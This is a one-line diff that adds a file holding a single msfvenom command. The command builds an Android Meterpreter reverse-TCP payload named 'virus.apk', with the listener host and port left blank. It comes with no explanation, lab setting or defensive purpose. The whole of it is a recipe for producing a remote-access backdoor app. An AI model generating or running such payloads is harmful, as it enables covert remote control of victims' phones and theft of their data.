@@ -1,0 +1,1 @@
+msfvenom -p android/meterpreter/reverse_tcp lhost=  lport=  R> virus.apk
